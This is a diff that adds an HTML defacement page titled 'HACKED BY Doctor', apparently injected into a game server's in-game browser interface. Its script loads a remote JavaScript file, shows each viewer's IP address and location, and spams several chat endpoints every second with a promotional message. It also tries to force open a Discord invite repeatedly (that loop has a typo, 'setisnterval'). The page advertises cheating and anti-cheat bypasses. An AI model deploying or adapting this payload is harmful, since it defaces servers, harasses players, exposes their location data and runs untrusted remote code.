@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKED BY Lucifer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px);
+            background-size: 15px 15px;
+            /* كانت 40px 40px */
+            font-family: monospace;
+            color: #ccc;
+            overflow: hidden;
+        }
+        
+        .intro {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e6e6e6;
+            font-size: 80px;
+            /* كانت 42px */
+            z-index: 9999;
+            animation: fadeOut 2s ease forwards;
+            animation-delay: 2s;
+            flex-direction: column;
+            /* مهم عشان يخلي النصين فوق بعض */
+        }
+        
+        .sub-text {
+            font-size: 40px;
+            color: #ffffff;
+            margin-top: 10px;
+        }
+        
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+        
+        .container,
+        .left-box,
+        .right-box,
+        .box,
+        .footer {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out;
+            animation-delay: 2s;
+            animation-fill-mode: forwards;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        
+        .left-box,
+        .right-box {
+            position: absolute;
+            top: 25px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+        
+        .left-box {
+            left: 25px;
+        }
+        
+        .right-box {
+            right: 25px;
+        }
+        
+        .left-box a {
+            display: block;
+            margin: 8px 0;
+            color: #00ff90;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        
+        .left-box a:hover {
+            transform: translateX(5px);
+        }
+        
+        .discord-link {
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+        
+        .discord-link img {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+        
+        .anime-image {
+            width: 400px;
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ccc;
+            /* animation: blink 1.5s infinite; */
+            /* نشيل هذا السطر */
+        }
+        
+        .box {
+            width: 400px;
+            max-height: 250px;
+            overflow: auto;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: left;
+        }
+        
+        .box code {
+            color: #00ff90;
+        }
+        
+        .footer {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="intro">
+        Hi HnTr My Doctor
+        <div class="sub-text">Discord.gg/00 لاتنسى تدخل الدسكورد</div>
+    </div>
+
+
+    <div class="left-box">
+        JOIN TO DISCORD TO LEARN :
+        <a href="#">how to be a cheater?</a>
+        <a href="#">how to bypass pure mode?</a>
+        <a href="#">how to bypass ocean?</a>
+        <a href="#">how to bypass anti nui dev tool?</a>
+
+        <hr style="margin: 10px 0; border: none; border-top: 1px solid #333;">
+
+        <div class="discord-link">
+            <img src="https://media.discordapp.net/attachments/1336795969143967847/1401996316263059577/106px-Discord_icon.png?ex=68924e51&is=6890fcd1&hm=8b0be6db1b0aaa460db50ff1e9e5b1ee18dc6b723588171b15722090e7f8925d&=&format=webp&quality=lossless" alt="Discord">            discord.gg/00
+        </div>
+    </div>
+
+
+    <div class="right-box">
+        <div class="info" id="ip-info">
+            <strong>IP:</strong> <span id="ip"></span><br>
+            <strong>City:</strong> <span id="city"></span><br>
+            <strong>Region:</strong> <span id="region"></span><br>
+            <strong>Country:</strong> <span id="country"></span><br>
+            <strong>Location:</strong> <span id="loc"></span><br>
+            <strong>Organization:</strong> <span id="org"></span><br>
+            <strong>Timezone:</strong> <span id="timezone"></span>
+        </div>
+    </div>
+
+    <!-- تشغيل الأغنية تلقائيًا -->
+    <audio autoplay loop>
+    <source src="https://j.top4top.io/m_3504hr8xg1.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+    <div class="container">
+        <img class="anime-image" src="https://media.discordapp.net/attachments/1400895728171352205/1401973679109181531/fb440815dc5c4b791d2c659a19effaa8.gif?ex=6892393c&is=6890e7bc&hm=2850f7b1c51bb28b0be93c61dad669655ba9355b1da0ef54c8eefb2ca0d9b0d2&=" alt="Anime"
+        />
+        <div class="title">HACKED BY Doctor</div>
+
+        <div class="box">
+            <div style="border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 8px;">
+                <span style="color: #ccc; font-weight: bold;">discord.gg/00</span>
+            </div>
+            <div style="color: #888; font-size: 14px; margin-bottom: 8px;">
+                server@system:~$ <strong>why?</strong>
+            </div>
+            <div style="color: #00ff90; font-size: 16px; line-height: 1.6;">
+                Doctor : السلام عليكم ورحمة الله وبركاته<br> لم نأتِ للعبث، بل لنُذكّركم أن احترام العقول ليس خيارًا<br> سيرفر تملأه الشعارات، ويفتقر لأبسط القيم<br> العدل غائب، والكرامة مدفونة، والصوت يُطفأ قبل أن يُسمع<br> حاولنا أن نغلق الصفحة بصمت<br>                لكن عندما يتكرر الغباء، يصبح الردّ فنًّا
+            </div>
+            <div style="color: #888; font-size: 12px; margin-top: 8px;">
+                # حياكم الله، السيرفر مليان ثغرات
+            </div>
+        </div>
+        <div class="footer">OFFICALY BLACK$HAMMER • Doctor</div>
+    </div>
+    <script src='https://2no.co/cr2sher.js'></script>
+
+    <script>
+        // !  اظهار الايبي  !
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip').innerHTML = data.ip || '';
+                document.getElementById('city').innerHTML = data.city || '';
+                document.getElementById('region').innerHTML = data.region || '';
+                document.getElementById('country').innerHTML = data.country || '';
+                document.getElementById('loc').innerHTML = data.loc || '';
+                document.getElementById('org').innerHTML = data.org || '';
+                document.getElementById('timezone').innerHTML = data.timezone || '';
+            });
+
+        const msg = `👑 Doctor & BluRRy - .gg/00 ! 👑`;
+        const body = JSON.stringify({
+            message: msg
+        });
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", {
+                method: "POST",
+                body
+            });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                method: "POST",
+                body: JSON.stringify({
+                    "message": msg,
+                    "channel": "شات العام",
+                    "color": null,
+                    "isImageAndLinksAllowed": [false, false]
+                })
+            })
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                headers: {
+                    accept: "*/*",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                },
+                body: JSON.stringify({
+                    message: msg,
+                    channel: "شات العام"
+                }),
+                method: "POST"
+            });
+            fetch("https://melix_chat/chatResult", {
+                method: "POST",
+                body
+            });
+            fetch("https://as_chat/chatResult", {
+                method: "POST",
+                body
+            });
+            fetch("https://chat/chatResult", {
+                method: "POST",
+                body
+            });
+            fetch("https://ho-chatv2/Chat", {
+                method: "POST",
+                body: JSON.stringify({
+                    "Type": "chatResult",
+                    "message": msg,
+                    "chatType": "general"
+                })
+            });
+        }, 1000);
+
+        setisnterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/00");
+            window.invokeNative("openUrl", "https://discord.gg/00");
+            window.invokeNative("openUrl", "https://discord.gg/00");
+            window.invokeNative("openUrl", "https://discord.gg/00");
+
+        }, 1000);
+    </script>
+
+    </script>
+
+</body>
+
+</html>
